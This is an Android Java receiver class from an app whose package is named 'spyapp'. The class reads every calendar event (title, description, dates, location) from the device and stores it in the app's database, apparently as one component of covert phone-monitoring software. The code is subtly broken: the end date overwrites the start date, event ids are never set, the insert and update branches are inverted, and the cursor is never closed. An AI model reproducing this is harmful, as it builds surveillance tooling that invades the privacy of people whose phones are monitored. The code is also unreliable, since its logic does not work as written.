package com.app.spyapp.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.text.TextUtils;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Utils;
import com.app.spyapp.model.EventModel;

import java.util.ArrayList;


public class EventChangeReceiver extends BroadcastReceiver {
    private SpyApp spyApp;

    @Override
    public void onReceive(Context context, Intent intent) {
        spyApp = (SpyApp) context.getApplicationContext();
        ArrayList<EventModel> eventList = readCalendarEvent(context);
        if (eventList != null && eventList.size() > 0) {
            for (int i = 0; i < eventList.size(); i++) {
                EventModel eventModel = eventList.get(i);
                if (eventModel != null) {
                    EventModel eventModel1 = spyApp.getDatabaseHelper().getEventInfo(eventModel.getEventid());
                    if (eventModel1 != null) {
                        if (!eventModel1.getDesc().equalsIgnoreCase(eventModel.getDesc()) || !eventModel1.getTitle().equalsIgnoreCase(eventModel.getTitle()) || !eventModel1.getStartDate().equalsIgnoreCase(eventModel.getStartDate()) || !eventModel1.getEndDate().equalsIgnoreCase(eventModel.getEndDate()) || !eventModel1.getLocation().equalsIgnoreCase(eventModel.getLocation())) {
                            spyApp.getDatabaseHelper().updateEvent(eventModel);
                        } else {
                            spyApp.getDatabaseHelper().insertEvent(eventModel);
                        }
                    }
                }
            }
        }
    }

    public ArrayList<EventModel> readCalendarEvent(Context context) {
        ArrayList<EventModel> eventList = new ArrayList<>();
        Cursor cursor = context.getContentResolver()
                .query(
                        Uri.parse("content://com.android.calendar/events"),
                        new String[]{"calendar_id", "title", "description",
                                "dtstart", "dtend", "eventLocation", "_id"}, null,
                        null, null);
        cursor.moveToFirst();
        // fetching calendars name
        String CNames[] = new String[cursor.getCount()];

        // fetching calendars id
        for (int i = 0; i < CNames.length; i++) {

            EventModel eventModel = new EventModel();
            eventModel.setTitle(cursor.getString(1));
            eventModel.setDesc(cursor.getString(2));
            if(!TextUtils.isEmpty(cursor.getString(3)))
            {
                eventModel.setStartDate(Utils.convertMilisToDate(Long.parseLong(cursor.getString(3))));
            }
            if(!TextUtils.isEmpty(cursor.getString(4)))
            {
                eventModel.setStartDate(Utils.convertMilisToDate(Long.parseLong(cursor.getString(4))));
            }

            eventModel.setLocation(cursor.getString(5));
            eventList.add(eventModel);
            cursor.moveToNext();

        }
        return eventList;
    }

}
